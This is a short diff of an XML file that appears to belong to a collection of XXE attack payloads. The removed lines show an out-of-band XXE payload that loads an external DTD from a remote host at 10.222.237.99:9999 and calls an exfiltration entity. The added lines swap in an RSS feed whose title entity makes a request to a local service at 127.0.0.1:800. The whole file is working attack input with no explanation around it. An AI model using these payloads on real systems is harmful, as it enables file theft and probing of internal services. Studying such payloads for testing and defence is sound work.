@@ -1,7 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-<!ENTITY % sp SYSTEM "http://10.222.237.99:9999/payload.dtd">
-%sp;
-%param1;
-%exfil;
-]>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "http://127.0.0.1:800" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>The Blog</title>
+<item>
+<title>&xxe;</title>
+</item>
+</channel>
+</rss>
